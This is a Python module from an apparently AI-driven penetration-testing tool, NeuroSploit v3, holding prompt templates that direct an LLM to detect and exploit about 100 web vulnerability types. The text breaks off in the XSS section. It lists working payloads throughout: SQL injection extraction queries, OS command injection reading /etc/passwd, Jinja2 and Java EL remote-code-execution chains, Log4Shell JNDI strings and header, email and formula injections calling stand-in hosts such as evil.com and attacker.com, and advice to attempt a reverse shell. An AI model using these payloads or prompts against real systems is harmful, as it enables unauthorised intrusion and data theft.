"""
NeuroSploit v3 - Per-Vulnerability AI Decision Prompts

100 vulnerability types, each with structured prompt templates for:
- Detection strategy, test methodology, payload selection
- Verification criteria, exploitation guidance, false positive indicators
- Technology-specific hints

Inspired by Shannon's per-vuln prompt architecture.
"""

import re
import random
import string
from typing import Dict, Optional


def _rand_id(length: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _resolve(template: str, ctx: dict) -> str:
    """Resolve {{VAR}} placeholders in a template string."""
    def _repl(m):
        key = m.group(1)
        if key == "RANDOM_ID":
            return _rand_id()
        return ctx.get(key, m.group(0))
    return re.sub(r"\{\{(\w+)\}\}", _repl, template)


def get_prompt(vuln_type: str, context: Optional[dict] = None) -> dict:
    """Get the AI prompt for a vuln type with resolved variables."""
    prompt = VULN_AI_PROMPTS.get(vuln_type)
    if not prompt:
        return {}
    if not context:
        return dict(prompt)
    resolved = {}
    for k, v in prompt.items():
        if isinstance(v, str):
            resolved[k] = _resolve(v, context)
        elif isinstance(v, dict):
            resolved[k] = {dk: _resolve(dv, context) if isinstance(dv, str) else dv for dk, dv in v.items()}
        else:
            resolved[k] = v
    return resolved


def build_testing_prompt(vuln_type: str, target: str = "", endpoint: str = "",
                         param: str = "", technology: str = "") -> str:
    """Build a full LLM testing prompt for a specific vuln type.

    Includes per-type methodology AND anti-hallucination proof requirements.
    """
    ctx = {"TARGET_URL": target, "ENDPOINT": endpoint, "PARAMETER": param, "TECHNOLOGY": technology}
    p = get_prompt(vuln_type, ctx)
    if not p:
        return f"Test the target for {vuln_type} vulnerabilities."
    parts = [p.get("role", ""), "", "## Detection Strategy", p.get("detection_strategy", ""),
             "", "## Test Methodology", p.get("test_methodology", ""),
             "", "## Payload Selection", p.get("payload_selection", ""),
             "", "## Verification Criteria", p.get("verification_criteria", ""),
             "", "## False Positive Indicators", p.get("false_positive_indicators", "")]
    tech = p.get("technology_hints", {})
    if technology and technology.lower() in tech:
        parts += ["", "## Technology-Specific Guidance", tech[technology.lower()]]

    # Append proof requirements from system prompts
    try:
        from backend.core.vuln_engine.system_prompts import VULN_TYPE_PROOF_REQUIREMENTS
        proof_req = VULN_TYPE_PROOF_REQUIREMENTS.get(vuln_type)
        if proof_req:
            parts += ["", "## Proof of Execution Requirements", proof_req]
    except ImportError:
        pass

    return "\n".join(parts)


def get_verification_prompt(vuln_type: str, evidence: str = "", response: str = "") -> str:
    """Build a verification prompt to confirm/reject a finding.

    Includes anti-hallucination directives and per-type proof requirements.
    """
    p = VULN_AI_PROMPTS.get(vuln_type, {})
    criteria = p.get("verification_criteria", "Check if the vulnerability is confirmed with concrete evidence.")
    fp = p.get("false_positive_indicators", "No known false positive patterns.")

    # Get proof requirements from system prompts
    proof_req = ""
    try:
        from backend.core.vuln_engine.system_prompts import VULN_TYPE_PROOF_REQUIREMENTS
        proof_req = VULN_TYPE_PROOF_REQUIREMENTS.get(vuln_type, "")
    except ImportError:
        pass

    parts = [
        f"Verify this {vuln_type} finding.",
        "",
        "## Verification Criteria",
        criteria,
        "",
        "## False Positive Indicators",
        fp,
    ]

    if proof_req:
        parts += ["", "## Proof of Execution Requirements", proof_req]

    parts += [
        "",
        "## Evidence Provided",
        evidence[:2000],
        "",
        "## Response Sample",
        response[:2000],
        "",
        "## ANTI-HALLUCINATION DIRECTIVE",
        "- You MUST point to SPECIFIC strings/data in the evidence or response that prove exploitation.",
        "- AI reasoning alone is NOT evidence. 'The payload was likely processed' is NOT proof.",
        "- Status code differences (200 vs 403) are NOT sufficient proof for most vulnerability types.",
        "- If you cannot find concrete proof in the actual response data, respond with REJECTED.",
        "",
        "Is this a TRUE POSITIVE or FALSE POSITIVE? Respond with CONFIRMED or REJECTED and explain why.",
        "If CONFIRMED, quote the specific evidence from the response. If REJECTED, explain what proof is missing.",
    ]

    return "\n".join(parts)


def get_poc_prompt(vuln_type: str, url: str = "", param: str = "",
                   payload: str = "", evidence: str = "", method: str = "GET") -> str:
    """Build a prompt for generating a high-quality PoC script.

    The prompt enforces realistic, reproducible PoC code that actually tests
    the vulnerability rather than generating theoretical code.
    """
    template = POC_TEMPLATES.get(vuln_type, POC_TEMPLATES.get("default", ""))

    return f"""Generate a Python proof-of-concept script for this confirmed {vuln_type.upper()} vulnerability.

## Target Details
- URL: {url}
- Parameter: {param}
- Method: {method}
- Payload: {payload[:500]}
- Evidence: {evidence[:500]}

## PoC Requirements
{template}

## CRITICAL RULES
1. The PoC MUST be a working Python script using the requests library.
2. It MUST reproduce the EXACT vulnerability — send the same payload to the same endpoint.
3. It MUST verify the vulnerability by checking the response for the same evidence markers.
4. It MUST include proper error handling and clear output explaining what was found.
5. Do NOT generate theoretical code — the PoC must work against the actual target.
6. Include a verify() function that returns True if the vulnerability is confirmed.
7. Print clear output: [VULNERABLE] or [NOT VULNERABLE] with supporting evidence.

Return ONLY the Python code, no explanations."""


# ---------------------------------------------------------------------------
# Per-Vuln-Type PoC Templates — guide PoC generation for each type
# ---------------------------------------------------------------------------

POC_TEMPLATES: Dict[str, str] = {
    "sqli_error": (
        "1. Send the exact SQL payload that triggered the error.\n"
        "2. Check response for database error strings (SQL syntax, mysql_, pg_query).\n"
        "3. Try extracting database version with UNION SELECT if error-based confirmed.\n"
        "4. Print: exact error message found, database type detected."
    ),
    "sqli_union": (
        "1. Send ORDER BY payload to determine column count.\n"
        "2. Send UNION SELECT with version() and user().\n"
        "3. Parse and display extracted data.\n"
        "4. Print: column count, database version, current user."
    ),
    "sqli_blind": (
        "1. Send TRUE condition (AND 1=1) and FALSE condition (AND 1=2).\n"
        "2. Compare response lengths.\n"
        "3. Extract first character of version using SUBSTRING.\n"
        "4. Print: true/false response diff, first extracted character."
    ),
    "sqli_time": (
        "1. Send baseline request and measure time.\n"
        "2. Send SLEEP(5) payload and measure time.\n"
        "3. Repeat 3 times for consistency.\n"
        "4. Print: baseline time, delayed times, average delay."
    ),
    "xss_reflected": (
        "1. Send the XSS payload to the vulnerable parameter.\n"
        "2. Check if payload appears UNESCAPED in response body.\n"
        "3. Analyze context (check if in script tag, attribute, HTML body).\n"
        "4. Print: payload found at offset X, surrounding context, executable=yes/no."
    ),
    "xss_stored": (
        "1. Phase 1: Submit XSS payload via POST to storage endpoint.\n"
        "2. Phase 2: GET the display page where stored content renders.\n"
        "3. Search for unescaped payload in HTML source.\n"
        "4. Print: submission response, display page URL, payload in source."
    ),
    "ssrf": (
        "1. Send internal URL (http://169.254.169.254/latest/meta-data/) as payload.\n"
        "2. Check response for internal resource content (ami-id, instance-id, etc.).\n"
        "3. Also send benign URL as negative control and compare responses.\n"
        "4. Print: internal content found, negative control comparison."
    ),
    "lfi": (
        "1. Send path traversal payload (../../etc/passwd).\n"
        "2. Check response for file content markers (root:x:0:0).\n"
        "3. Try multiple traversal depths.\n"
        "4. Print: file content found, specific markers matched."
    ),
    "command_injection": (
        "1. Send command injection payload (;id or |whoami).\n"
        "2. Check response for command output (uid=, root, hostname).\n"
        "3. Also try time-based: ;sleep 5 and measure response time.\n"
        "4. Print: command output found, or timing measurement."
    ),
    "ssti": (
        "1. Send mathematical expression ({{7*7}}).\n"
        "2. Check response for evaluated result (49).\n"
        "3. Verify raw expression ({{7*7}}) is NOT in response.\n"
        "4. Print: evaluated result found, template engine likely identified."
    ),
    "idor": (
        "1. Authenticate as User A.\n"
        "2. Request User A's resource to get baseline response.\n"
        "3. Request User B's resource using User A's session.\n"
        "4. Compare: does step 3 return User B's ACTUAL data?\n"
        "5. Print: your data vs target data comparison, fields leaked."
    ),
    "bola": (
        "1. Authenticate as User A, get User A's object.\n"
        "2. With User A's token, request User B's object by changing ID.\n"
        "3. COMPARE RESPONSE DATA (not just status code!).\n"
        "4. Check if response contains User B's specific fields.\n"
        "5. Print: data comparison, specific fields from other user found."
    ),
    "bfla": (
        "1. Authenticate as regular user.\n"
        "2. Call admin endpoint with regular user token.\n"
        "3. COMPARE RESPONSE DATA: does it return admin-level data?\n"
        "4. Check for actual data vs empty/error response.\n"
        "5. Print: regular user token, admin endpoint, data received."
    ),
    "open_redirect": (
        "1. Send URL with redirect payload pointing to external domain.\n"
        "2. Check for 3xx status with Location header pointing to attacker domain.\n"
        "3. Also check for meta-refresh or JS redirect in body.\n"
        "4. Print: redirect status, Location header value."
    ),
    "csrf": (
        "1. Generate HTML form targeting the vulnerable endpoint.\n"
        "2. Verify no CSRF token required.\n"
        "3. Submit form and verify state change.\n"
        "4. Print: HTML PoC form, response showing state change."
    ),
    "default": (
        "1. Send the exact payload that triggered the finding.\n"
        "2. Check response for the specific evidence markers.\n"
        "3. Send a negative control (benign input) and compare.\n"
        "4. Print: evidence found, negative control comparison."
    ),
}


# ---------------------------------------------------------------------------
# VULN_AI_PROMPTS - 100 vulnerability type prompt templates
# ---------------------------------------------------------------------------

VULN_AI_PROMPTS: Dict[str, dict] = {

    # ===== INJECTION (1-18) =====

    "sqli_error": {
        "role": "You are an expert SQL injection specialist focusing on error-based detection.",
        "detection_strategy": "Inject SQL syntax breakers (single quotes, double quotes, semicolons) into parameters and look for database error messages in responses. Target: {{ENDPOINT}}",
        "test_methodology": "1. Send baseline request to {{ENDPOINT}} with clean parameter {{PARAMETER}}. 2. Inject ' and \" to break SQL syntax. 3. Look for error strings (MySQL, PostgreSQL, MSSQL, Oracle, SQLite). 4. Try UNION SELECT NULL to determine column count. 5. Extract database version.",
        "payload_selection": "Start with: ' \" ; ') -- Then try: ' OR 1=1-- ' UNION SELECT NULL-- 1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "verification_criteria": "CONFIRMED only if: database error message appears in response (not in comments/JS), OR UNION-based extraction returns data, OR Boolean condition changes response. Raw SQL keywords alone are NOT sufficient.",
        "exploitation_guidance": "Extract DB version, user, database name. Enumerate tables via information_schema. Extract sensitive data. Document exact query and extracted data as proof.",
        "false_positive_indicators": "Generic 500 errors without DB-specific messages. Error messages in JavaScript comments or hidden fields that are always present. WAF block pages.",
        "technology_hints": {"php": "Try ' OR '1'='1 and check for mysql_error output", "java": "Look for java.sql.SQLException in stack traces", "aspnet": "Check for System.Data.SqlClient errors"}
    },

    "sqli_union": {
        "role": "You are a UNION-based SQL injection specialist.",
        "detection_strategy": "Determine column count with ORDER BY or UNION SELECT NULL, then extract data through UNION queries.",
        "test_methodology": "1. Find injectable param at {{ENDPOINT}}. 2. ORDER BY 1,2,3... to find column count. 3. UNION SELECT NULL,NULL... matching columns. 4. Replace NULLs with version(),user(),database(). 5. Extract table/column names from information_schema.",
        "payload_selection": "ORDER BY 1-- ORDER BY 5-- ORDER BY 10-- Then: ' UNION SELECT NULL-- (increase NULLs). Then: ' UNION SELECT version(),NULL,NULL--",
        "verification_criteria": "CONFIRMED only if: injected UNION query returns visible data in the response (version string, username, table names). Column count must match.",
        "exploitation_guidance": "Extract: version(), user(), database(), then information_schema.tables, then target table data. Screenshot each extraction step.",
        "false_positive_indicators": "UNION keyword appears but no data extraction. Response is identical to baseline. WAF blocks the query.",
        "technology_hints": {"mysql": "Use information_schema.tables, GROUP_CONCAT()", "postgresql": "Use pg_tables, string_agg()", "mssql": "Use sysobjects, sp_tables"}
    },

    "sqli_blind": {
        "role": "You are a Boolean-based blind SQL injection specialist.",
        "detection_strategy": "Inject Boolean conditions and compare response differences to infer data bit by bit.",
        "test_methodology": "1. Send ' AND 1=1-- vs ' AND 1=2-- to {{ENDPOINT}}. 2. Compare response length/content. 3. If different, inject SUBSTRING queries to extract data character by character. 4. Automate with binary search on ASCII values.",
        "payload_selection": "' AND 1=1-- vs ' AND 1=2-- Then: ' AND (SELECT SUBSTRING(version(),1,1))='5'-- ' AND ASCII(SUBSTRING((SELECT user()),1,1))>64--",
        "verification_criteria": "CONFIRMED if: TRUE condition (1=1) gives different response than FALSE condition (1=2), AND this difference is consistent across multiple tests.",
        "exploitation_guidance": "Extract DB version character by character as proof. Document true vs false response differences clearly.",
        "false_positive_indicators": "Random response variations unrelated to injection. Responses differ due to caching or dynamic content.",
        "technology_hints": {"mysql": "Use IF() and SUBSTRING()", "postgresql": "Use CASE WHEN and SUBSTR()"}
    },

    "sqli_time": {
        "role": "You are a time-based blind SQL injection specialist.",
        "detection_strategy": "Inject time delay functions and measure response time to detect injection without visible output differences.",
        "test_methodology": "1. Measure baseline response time for {{ENDPOINT}}. 2. Inject SLEEP/WAITFOR/pg_sleep with 5-second delay. 3. If response takes 5+ seconds, confirm with 10-second delay. 4. Use IF(condition, SLEEP(5), 0) for data extraction.",
        "payload_selection": "' AND SLEEP(5)-- '; WAITFOR DELAY '0:0:5'-- ' AND pg_sleep(5)-- ' OR IF(1=1,SLEEP(5),0)--",
        "verification_criteria": "CONFIRMED if: injected delay consistently adds expected time (within 1-second tolerance), AND baseline without delay is fast. Test at least 3 times to rule out network jitter.",
        "exploitation_guidance": "Extract version with: IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0). Document timing measurements as proof.",
        "false_positive_indicators": "Server is generally slow. Network latency causes variable timing. Load balancer causes inconsistent response times.",
        "technology_hints": {"mysql": "SLEEP(5), BENCHMARK(5000000,SHA1('test'))", "mssql": "WAITFOR DELAY '0:0:5'", "postgresql": "pg_sleep(5)"}
    },

    "command_injection": {
        "role": "You are an OS command injection specialist.",
        "detection_strategy": "Inject OS command separators and time-based payloads to detect command execution on {{ENDPOINT}}.",
        "test_methodology": "1. Identify parameters that might pass to system commands. 2. Inject command separators: ; | ` $() 3. Use time-based detection: ;sleep 5; or |ping -c 5 127.0.0.1| 4. Try out-of-band detection with unique DNS lookups. 5. Confirm with command output extraction.",
        "payload_selection": ";id; |id| `id` $(id) ;sleep 5; |ping -c 5 127.0.0.1| ;cat /etc/passwd; & whoami & ;echo {{RANDOM_ID}}; %0aid",
        "verification_criteria": "CONFIRMED if: command output visible in response (uid=, root:, hostname output), OR consistent time delay with sleep/ping, OR unique marker from echo appears. Command separators alone are NOT sufficient.",
        "exploitation_guidance": "Prove RCE: extract id, whoami, hostname, /etc/passwd (first 5 lines). Show working PoC command. Try reverse shell if authorized.",
        "false_positive_indicators": "Error message mentioning command characters but no execution. Input sanitization removing special chars. Timeout due to server issues not injection.",
        "technology_hints": {"php": "Check passthru(), system(), exec(), shell_exec(), backtick operator", "python": "Check os.system(), subprocess.call() with shell=True", "node": "Check child_process.exec()"}
    },

    "ssti": {
        "role": "You are a Server-Side Template Injection specialist.",
        "detection_strategy": "Inject template expressions ({{7*7}}, ${7*7}, #{7*7}) and check if the server evaluates them, returning computed results.",
        "test_methodology": "1. Inject {{7*7}} into {{PARAMETER}} at {{ENDPOINT}}. 2. Check if response contains '49'. 3. Try ${7*7}, #{7*7}, <%=7*7%>, {7*7}. 4. Identify template engine from error messages. 5. Escalate to RCE payload for the specific engine.",
        "payload_selection": "{{7*7}} {{7*'7'}} ${7*7} #{7*7} <%=7*7%> {{config}} {{self.__class__}} ${T(java.lang.Runtime).getRuntime().exec('id')}",
        "verification_criteria": "CONFIRMED if: mathematical expression is evaluated (49 appears where 7*7 was injected), OR template objects/config are exposed. String '{{7*7}}' appearing literally is NOT a finding.",
        "exploitation_guidance": "Identify engine (Jinja2, Twig, Freemarker, Velocity, Pug). Escalate to: Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Document engine and RCE proof.",
        "false_positive_indicators": "Template syntax appears literally in output (not evaluated). Client-side template rendering (Angular/Vue). Static content containing template-like patterns.",
        "technology_hints": {"python": "Jinja2/Mako: {{config}}, {{''.__class__}}", "php": "Twig: {{_self.env}}", "java": "Freemarker: ${7*7}, Velocity: #set($x=7*7)${x}"}
    },

    "nosql_injection": {
        "role": "You are a NoSQL injection specialist targeting MongoDB, CouchDB, and similar databases.",
        "detection_strategy": "Inject NoSQL operators ($gt, $ne, $regex) and JavaScript expressions to bypass authentication or extract data.",
        "test_methodology": "1. Try JSON operator injection: {\"$gt\":\"\"} in login fields. 2. Try query parameter injection: param[$ne]=1. 3. Test JavaScript injection: ';return true;var a=' 4. Check for MongoDB error messages.",
        "payload_selection": "{\"$gt\":\"\"} {\"$ne\":\"\"} {\"$regex\":\".*\"} [$ne]=1 [$gt]= {\"$where\":\"sleep(5000)\"} ';return true;var a='",
        "verification_criteria": "CONFIRMED if: authentication bypassed with $ne/$gt operators, OR different results returned with NoSQL operators vs normal input, OR time delay with $where/sleep.",
        "exploitation_guidance": "Demonstrate auth bypass or data extraction. Extract usernames with $regex binary search. Document exact NoSQL payload and resulting data.",
        "false_positive_indicators": "Generic error without NoSQL indicators. Input treated as literal string. Parameter rejected by validation.",
        "technology_hints": {"node": "Express + MongoDB: check for qs parsing of brackets param[$ne]", "python": "PyMongo: check for dict injection in find()"}
    },

    "ldap_injection": {
        "role": "You are an LDAP injection specialist.",
        "detection_strategy": "Inject LDAP filter metacharacters (*, ), (, |, &) to modify LDAP queries and bypass authentication or enumerate directory entries.",
        "test_methodology": "1. Inject * into {{PARAMETER}} to match all entries. 2. Try )(cn=*))(|(cn=* to break filter. 3. Test )(|(password=*) to extract attributes. 4. Check for LDAP error messages in response.",
        "payload_selection": "* *)(cn=*))(|(cn=* )(|(password=*) admin)(&) ))(objectClass=*))(|(objectClass= *)(uid=*))(|(uid=*",
        "verification_criteria": "CONFIRMED if: wildcard returns all entries, OR filter manipulation changes results, OR LDAP error message appears with query details.",
        "exploitation_guidance": "Enumerate users, extract attributes (email, phone, groups). Demonstrate auth bypass with injected filter.",
        "false_positive_indicators": "Asterisk treated as literal search. Generic errors without LDAP context. No directory results returned.",
        "technology_hints": {"java": "Check for DirContext.search() with string concat", "php": "Check for ldap_search() with unescaped input"}
    },

    "xpath_injection": {
        "role": "You are an XPath injection specialist.",
        "detection_strategy": "Inject XPath expressions to manipulate XML queries used for authentication or data retrieval.",
        "test_methodology": "1. Inject ' or '1'='1 into {{PARAMETER}}. 2. Try '] | //user/* | //user[' to extract all nodes. 3. Check for XML/XPath error messages. 4. Test blind XPath with string-length() and substring().",
        "payload_selection": "' or '1'='1 ' or ''=' '] | //user/* | //user[' ' and count(//user)>0 and '1'='1 ' or substring(//user[1]/password,1,1)='a",
        "verification_criteria": "CONFIRMED if: Boolean injection changes results (1=1 vs 1=2), OR additional XML data is extracted, OR XPath error messages appear.",
        "exploitation_guidance": "Extract node values with substring() blind extraction. Enumerate XML structure. Document data extracted as proof.",
        "false_positive_indicators": "Single quote causes generic error. XML parsing error unrelated to injection. No data change between true/false conditions.",
        "technology_hints": {"php": "Check for simplexml_load_string() + xpath()", "java": "Check for XPathExpression.evaluate()"}
    },

    "graphql_injection": {
        "role": "You are a GraphQL security specialist.",
        "detection_strategy": "Test for introspection exposure, injection in variables/arguments, batching attacks, and authorization bypass via nested queries.",
        "test_methodology": "1. Send introspection query to discover schema. 2. Test for injection in string arguments. 3. Try batching queries for rate limit bypass. 4. Test deeply nested queries for DoS. 5. Check for authorization bypass by accessing other users' data.",
        "payload_selection": "{__schema{types{name,fields{name,type{name}}}}} {__type(name:\"User\"){fields{name}}} Batch: [{query:\"...\",variables:{}},{query:\"...\",variables:{}}]",
        "verification_criteria": "CONFIRMED if: introspection returns full schema, OR unauthorized data accessed via query manipulation, OR injection in arguments modifies query behavior.",
        "exploitation_guidance": "Map full schema via introspection. Access unauthorized data. Demonstrate IDOR through ID manipulation in queries. Document schema and extracted data.",
        "false_positive_indicators": "Introspection intentionally enabled in dev mode. Authorization properly enforced on all resolvers. Input properly parameterized.",
        "technology_hints": {"node": "Check Apollo Server introspection settings", "python": "Check Graphene/Ariadne authorization decorators"}
    },

    "crlf_injection": {
        "role": "You are a CRLF injection and HTTP response splitting specialist.",
        "detection_strategy": "Inject \\r\\n (CRLF) sequences into parameters reflected in HTTP headers to inject arbitrary headers or split responses.",
        "test_methodology": "1. URL-encode CRLF: %0d%0a into {{PARAMETER}}. 2. Try injecting a custom header: %0d%0aX-Injected:{{RANDOM_ID}}. 3. Check if new header appears in response. 4. Try Set-Cookie injection for session fixation. 5. Try full response splitting with double CRLF.",
        "payload_selection": "%0d%0aX-Test:{{RANDOM_ID}} %0d%0aSet-Cookie:evil=1 %0d%0a%0d%0a<html>injected %0d%0aLocation:http://evil.com \\r\\nX-Test:1",
        "verification_criteria": "CONFIRMED if: injected header appears in HTTP response headers (visible in raw response), OR response is split with injected body content.",
        "exploitation_guidance": "Demonstrate header injection (custom header in response), session fixation (Set-Cookie), or XSS via response splitting. Document raw HTTP response.",
        "false_positive_indicators": "CRLF characters stripped or encoded in output. Header appears in body not headers. URL-encoded characters shown literally.",
        "technology_hints": {"php": "Check header() with user input", "java": "Check HttpServletResponse.setHeader()/addHeader()", "node": "Check res.setHeader() with user input"}
    },

    "header_injection": {
        "role": "You are an HTTP header injection specialist.",
        "detection_strategy": "Inject content into HTTP request/response headers via user-controlled parameters that are reflected in headers like Location, Set-Cookie, or custom headers.",
        "test_methodology": "1. Identify parameters reflected in response headers. 2. Inject header values with CRLF. 3. Test Host header injection for password reset poisoning. 4. Test X-Forwarded-For/Host manipulation.",
        "payload_selection": "Host: evil.com X-Forwarded-Host: evil.com X-Forwarded-For: 127.0.0.1 %0d%0aInjected-Header:test",
        "verification_criteria": "CONFIRMED if: injected value appears in response headers, OR Host header manipulation changes behavior (password reset URL, redirect target).",
        "exploitation_guidance": "Demonstrate password reset poisoning, cache poisoning via Host header, or access control bypass via X-Forwarded-For.",
        "false_positive_indicators": "Host header has no effect on application behavior. Headers are properly validated. CRLF sequences stripped.",
        "technology_hints": {"php": "Check $_SERVER['HTTP_HOST'] usage in URLs", "python": "Check request.host usage in Django/Flask"}
    },

    "email_injection": {
        "role": "You are an email header injection specialist.",
        "detection_strategy": "Inject email headers (CC, BCC, Subject) via form fields that feed into email sending functions to send spam or exfiltrate data.",
        "test_methodology": "1. Find contact/feedback forms at {{ENDPOINT}}. 2. Inject \\r\\nCC:attacker@evil.com in email field. 3. Try BCC injection. 4. Try Subject injection to change email subject.",
        "payload_selection": "test@test.com%0d%0aCc:attacker@evil.com test@test.com\\r\\nBcc:spy@evil.com test@test.com%0aSubject:Hacked",
        "verification_criteria": "CONFIRMED if: email is sent to injected CC/BCC address (verified via external mailbox), OR email subject/body is modified by injection.",
        "exploitation_guidance": "Demonstrate email sent to attacker-controlled address. Document injected headers and received email as proof.",
        "false_positive_indicators": "Email function validates/strips CRLF. Only single email address accepted. No email actually sent.",
        "technology_hints": {"php": "Check mail() function with unvalidated headers", "python": "Check smtplib usage with user input in headers"}
    },

    "expression_language_injection": {
        "role": "You are an Expression Language (EL) injection specialist targeting Java EE and Spring applications.",
        "detection_strategy": "Inject EL expressions ${...} or #{...} to evaluate code on the server, similar to SSTI but specific to Java EL.",
        "test_methodology": "1. Inject ${7*7} into {{PARAMETER}}. 2. Check for '49' in response. 3. Try ${applicationScope} for context info. 4. Escalate to RCE: ${Runtime.getRuntime().exec('id')}.",
        "payload_selection": "${7*7} #{7*7} ${applicationScope} ${T(java.lang.Runtime).getRuntime().exec('id')} ${pageContext.request.serverName}",
        "verification_criteria": "CONFIRMED if: EL expression evaluated (49 in output), OR server-side objects exposed, OR command executed.",
        "exploitation_guidance": "Extract server info, then escalate to RCE. Document evaluated expression and output.",
        "false_positive_indicators": "${...} appears literally. Client-side template processing. Spring EL disabled in views.",
        "technology_hints": {"java": "Check JSP EL, Spring SpEL, OGNL in Struts2"}
    },

    "log_injection": {
        "role": "You are a log injection/forging specialist.",
        "detection_strategy": "Inject newlines and fake log entries into parameters that are written to application logs, enabling log tampering or log-based attacks.",
        "test_methodology": "1. Inject \\n followed by fake log entry into {{PARAMETER}}. 2. Try injecting ANSI escape codes. 3. Test for log4j-style JNDI lookups: ${jndi:ldap://attacker.com/a}. 4. Check if injected content appears in accessible log files.",
        "payload_selection": "test%0aINFO:Admin_logged_in ${jndi:ldap://{{RANDOM_ID}}.attacker.com/a} test%0a%0a{{RANDOM_ID}} \\x1b[31mRED_TEXT",
        "verification_criteria": "CONFIRMED if: injected content appears as separate log line (visible in logs or log viewer), OR JNDI lookup triggers DNS callback, OR ANSI codes interpreted.",
        "exploitation_guidance": "Demonstrate log forging (fake admin login entry) or Log4Shell-style RCE via JNDI. Document injected content and log output.",
        "false_positive_indicators": "Newlines stripped before logging. JNDI lookups disabled/patched. Logs not accessible for verification.",
        "technology_hints": {"java": "Check Log4j/Logback with user input, JNDI lookup", "python": "Check logging module with user input format strings"}
    },

    "html_injection": {
        "role": "You are an HTML injection specialist.",
        "detection_strategy": "Inject HTML tags into parameters reflected in page output to modify page content, inject phishing forms, or deface content.",
        "test_methodology": "1. Inject <b>{{RANDOM_ID}}</b> into {{PARAMETER}}. 2. Check if bold text renders. 3. Try <form action='evil.com'> for phishing. 4. Inject <img src=x> to test tag injection. 5. Differentiate from XSS (no script execution needed).",
        "payload_selection": "<h1>INJECTED</h1> <b>{{RANDOM_ID}}</b> <img src=x onerror=alert(1)> <form action='http://evil.com'><input name=password><input type=submit> <a href='http://evil.com'>Click</a>",
        "verification_criteria": "CONFIRMED if: injected HTML tags are rendered by the browser (not displayed as text), visible as formatted content in response.",
        "exploitation_guidance": "Demonstrate content injection (defacement), phishing form injection, or link injection. Screenshot rendered output.",
        "false_positive_indicators": "HTML entities escaped (&lt;h1&gt;). Tags stripped by sanitizer. Content in non-HTML context (JSON, plain text).",
        "technology_hints": {"php": "Check echo/print without htmlspecialchars()", "python": "Check Jinja2 without |e filter or markupsafe"}
    },

    "csv_injection": {
        "role": "You are a CSV/formula injection specialist.",
        "detection_strategy": "Inject spreadsheet formulas (=CMD, +CMD, @SUM) into fields that are exported to CSV/Excel, enabling code execution when opened.",
        "test_methodology": "1. Inject =cmd|'/C calc'!A0 into {{PARAMETER}}. 2. Download exported CSV/Excel file. 3. Check if formula is preserved (not prefixed with '). 4. Test with =HYPERLINK(\"http://evil.com\",\"Click\").",
        "payload_selection": "=cmd|'/C calc'!A0 =1+1 +1+1 @SUM(1+1) =HYPERLINK(\"http://evil.com\") -1+1 =IMPORTXML(\"http://evil.com\",\"//a\")",
        "verification_criteria": "CONFIRMED if: formula executes or calculates when CSV is opened in Excel/Sheets (=1+1 shows 2), OR DDE command triggers.",
        "exploitation_guidance": "Demonstrate formula execution in exported spreadsheet. Document the export endpoint, injected payload, and Excel behavior.",
        "false_positive_indicators": "CSV export prefixes cells with single quote ('). Formula treated as text. Export is JSON/PDF not CSV.",
        "technology_hints": {"php": "Check fputcsv() without cell sanitization", "python": "Check csv.writer without prefix escaping"}
    },

    "orm_injection": {
        "role": "You are an ORM injection specialist targeting object-relational mapping layers.",
        "detection_strategy": "Inject ORM-specific query syntax to manipulate database queries through the ORM abstraction layer.",
        "test_methodology": "1. Identify ORM in use (Hibernate HQL, Django ORM, SQLAlchemy, ActiveRecord). 2. Inject ORM-specific operators: __gt, __contains for Django. 3. Test HQL injection: ' OR 1=1 in Hibernate. 4. Check for raw query exposure.",
        "payload_selection": "field__gt=0 field__contains=admin field__regex=.* ' OR '1'='1 (Django) FROM User WHERE name=''+OR+1=1--' (HQL)",
        "verification_criteria": "CONFIRMED if: ORM query manipulation returns unauthorized data, OR Boolean conditions change results, OR ORM error messages expose query structure.",
        "exploitation_guidance": "Extract data through ORM filter manipulation. Document ORM type, injected payload, and extracted data.",
        "false_positive_indicators": "ORM properly parameterizes queries. Filter operators rejected by validation. No visible query manipulation.",
        "technology_hints": {"python": "Django ORM lookups (__gt, __lt, __contains), SQLAlchemy text()", "java": "Hibernate HQL string concatenation", "ruby": "ActiveRecord where() with string interpolation"}
    },

    # ===== XSS (19-23) =====

    "xss_reflected": {
        "role": "You are a reflected XSS specialist. Your job is to find and exploit reflected cross-site scripting vulnerabilities.",
        "detection_strategy": "Inject unique markers into parameters and check if they appear unencoded in the HTML response. Then determine injection context (HTML body, attribute, JS, CSS) and craft context-appropriate payloads.",
        "test_methodology": (
            "1. CANARY PROBE: Inject unique harmless string (e.g., 'xsstest{{RANDOM_ID}}') into {{PARAMETER}} at {{ENDPOINT}}. "
            "Search response for unencoded reflection. If no reflection, try other parameters. "
            "2. CONTEXT DETECTION: Analyze HTML around reflected canary to determine injection context: "
            "HTML body, tag attribute (double/single/unquoted), JavaScript string (single/double/template literal), "
            "event handler, href/src attribute, textarea, style, SVG/MathML, HTML comment. "
            "3. FILTER PROBING: Test which characters pass through: < > \" ' / ( ) = ` ; "
            "Test which tags survive: script, img, svg, body, input, details, select, xss (custom), animatetransform, set, animate. "
            "Test which events survive: onload, onerror, onfocus, onbegin, ontoggle, onanimationend, onpointerover, onfocusin. "
            "4. ADAPTIVE PAYLOAD: Based on allowed chars/tags/events, craft targeted payloads: "
            "- If <script> blocked but <img> allowed: <img src=x onerror=alert(1)> "
            "- If common tags blocked but custom allowed: <xss autofocus tabindex=1 onfocus=alert(1)></xss> "
            "- If alert() blocked: try confirm(1), prompt(1), print(), alert`1`, eval(atob('YWxlcnQoMSk=')) "
            "- If parentheses blocked: use backtick alert`1` or Function constructor "
            "- If angle brackets blocked: break out of attribute context with event handlers "
            "5. ESCALATION: Try encoding bypasses (HTML entities, URL encoding, unicode escapes), WAF bypasses "
            "(case mixing, null bytes, nested tags), and polyglot payloads. "
            "6. CSP ANALYSIS: Check Content-Security-Policy header. If present, try CSP bypass techniques "
            "(Angular CDN for unsafe-eval, base tag injection, prefetch). "
            "7. VERIFY: Confirm JavaScript execution via alert/confirm/prompt or verify unescaped payload in executable context."
        ),
        "payload_selection": "Start with probe: neurosploit{{RANDOM_ID}} then context-specific: HTML body: <script>alert(document.domain)</script> Attribute: \" onmouseover=alert(1) x=\" JS string: ';alert(1)// Event handler: <img src=x onerror=alert(1)> SVG: <svg onload=alert(1)>",
